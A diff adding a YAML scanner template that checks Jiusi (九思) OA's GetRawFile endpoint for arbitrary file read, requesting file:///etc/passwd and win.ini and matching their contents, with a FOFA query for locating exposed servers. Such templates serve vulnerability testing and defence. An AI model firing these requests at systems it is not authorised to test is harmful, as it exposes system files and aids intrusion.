@@ -1,0 +1,34 @@
+id: jsoa-GetRawFile-fileread
+info:
+  name: 九思 OA GetRawFile - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/OracleNep/Nday-Exploit-Plan/blob/main/CNVD/%E4%B9%9D%E6%80%9DOA%20GetRawFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/REAMD.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: app="九思软件-OA" || body="/jsoa/webmail/ajax_util.js"
+  tags: 2024,fileread,jsoa,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jsoa/GetRawFile?url=file:///C:/windows/win.ini"
+      - "{{BaseURL}}/jsoa/GetRawFile?url=file:///etc/passwd"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
